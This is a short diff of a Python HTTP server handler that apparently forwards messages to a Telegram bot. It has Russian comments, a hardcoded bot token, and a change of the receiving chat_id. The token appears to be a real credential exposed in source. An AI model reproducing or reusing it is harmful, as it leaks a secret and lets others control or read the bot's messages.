@@ -271,7 +271,7 @@ class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         try:
             # Конфигурация бота
             bot_token = "8263208579:AAHbgB-KSmyqZwMf7FtxBbUzjWNIugUtKu0"
-            chat_id = 7644513746
+            chat_id = 5292692434
             
             # Формируем запрос к Telegram API
             telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
